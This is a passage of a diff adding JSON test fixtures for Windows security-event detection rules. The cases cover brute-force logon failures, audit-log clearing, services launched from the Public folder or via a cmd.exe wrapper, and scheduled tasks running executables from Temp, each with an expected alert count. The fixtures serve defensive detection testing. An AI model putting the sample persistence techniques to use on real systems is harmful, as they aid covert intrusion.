+            "TimeCreated": "2026-10-16T09:04:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1009,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "9 failures do not fire",
+        "items": [
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1000,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1001,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:01:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1002,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:01:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1003,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:02:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1004,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:02:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1005,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:03:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1006,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:03:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1007,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:04:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1008,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "10 failures spread over 2 hours do not fire",
+        "items": [
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1000,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:13:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1001,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:26:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1002,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:39:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1003,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:52:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1004,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T10:05:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1005,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T10:18:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1006,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T10:31:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1007,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T10:44:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1008,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T10:57:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1009,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "10 failures across 10 accounts do not fire",
+        "items": [
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1000,
+            "Data": {
+              "TargetUserName": "user0",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:01:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1001,
+            "Data": {
+              "TargetUserName": "user1",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:02:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1002,
+            "Data": {
+              "TargetUserName": "user2",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:03:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1003,
+            "Data": {
+              "TargetUserName": "user3",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:04:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1004,
+            "Data": {
+              "TargetUserName": "user4",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:05:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1005,
+            "Data": {
+              "TargetUserName": "user5",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:06:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1006,
+            "Data": {
+              "TargetUserName": "user6",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:07:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1007,
+            "Data": {
+              "TargetUserName": "user7",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:08:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1008,
+            "Data": {
+              "TargetUserName": "user8",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:09:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1009,
+            "Data": {
+              "TargetUserName": "user9",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "two sources are grouped separately",
+        "items": [
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1000,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1001,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:01:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1002,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:01:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1003,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:02:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1004,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:02:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1005,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:03:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1006,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:03:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1007,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:04:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1008,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:04:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1009,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1100,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.99",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1101,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.99",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:01:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1102,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.99",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:01:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1103,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.99",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:02:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1104,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.99",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:02:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1105,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.99",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:03:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1106,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.99",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:03:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1107,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.99",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:04:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1108,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.99",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:04:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1109,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.99",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:05:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1110,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.99",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:05:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1111,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.99",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          }
+        ],
+        "expect": 2
+      }
+    ],
+    "WTH-EVT-002": [
+      {
+        "name": "log cleared event fires",
+        "items": [
+          {
+            "Channel": "Security",
+            "EventId": 1102,
+            "TimeCreated": "2026-10-16T09:02:00.000Z",
+            "Provider": "Microsoft-Windows-Eventlog",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1,
+            "Data": {
+              "SubjectUserName": "labuser",
+              "SubjectDomainName": "WS-LAB-03"
+            }
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "logon success event does not fire",
+        "items": [
+          {
+            "Channel": "Security",
+            "EventId": 4624,
+            "TimeCreated": "2026-10-16T09:02:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 2,
+            "Data": {}
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-EVT-003": [
+      {
+        "name": "service from Public folder fires",
+        "items": [
+          {
+            "Channel": "Security",
+            "EventId": 4697,
+            "TimeCreated": "2026-10-16T09:03:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 3,
+            "Data": {
+              "ServiceName": "WinUpdateHelper",
+              "ServiceFileName": "C:\\Users\\Public\\svc.exe",
+              "ServiceAccount": "LocalSystem",
+              "ServiceStartType": "2",
+              "SubjectUserName": "labuser"
+            }
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "service with cmd wrapper fires",
+        "items": [
+          {
+            "Channel": "Security",
+            "EventId": 4697,
+            "TimeCreated": "2026-10-16T09:03:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 4,
+            "Data": {
+              "ServiceName": "Wrap",
+              "ServiceFileName": "cmd.exe /c C:\\x.bat",
+              "ServiceAccount": "LocalSystem",
+              "ServiceStartType": "2",
+              "SubjectUserName": "labuser"
+            }
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "Program Files service does not fire",
+        "items": [
+          {
+            "Channel": "Security",
+            "EventId": 4697,
+            "TimeCreated": "2026-10-16T09:03:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 5,
+            "Data": {
+              "ServiceName": "Vendor",
+              "ServiceFileName": "\"C:\\Program Files\\Vendor\\svc.exe\"",
+              "ServiceAccount": "LocalSystem",
+              "ServiceStartType": "2",
+              "SubjectUserName": "admin"
+            }
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-EVT-004": [
+      {
+        "name": "task with Temp command fires",
+        "items": [
+          {
+            "Channel": "Security",
+            "EventId": 4698,
+            "TimeCreated": "2026-10-16T09:03:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 6,
+            "Data": {
+              "TaskName": "\\Sync",
+              "SubjectUserName": "labuser",
+              "TaskContent": "<Task><Actions><Exec><Command>C:\\Users\\labuser\\AppData\\Local\\Temp\\x.exe</Command></Exec></Actions></Task>"
+            }
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "task with system command does not fire",
+        "items": [
+          {
+            "Channel": "Security",
+            "EventId": 4698,
+            "TimeCreated": "2026-10-16T09:03:00.000Z",
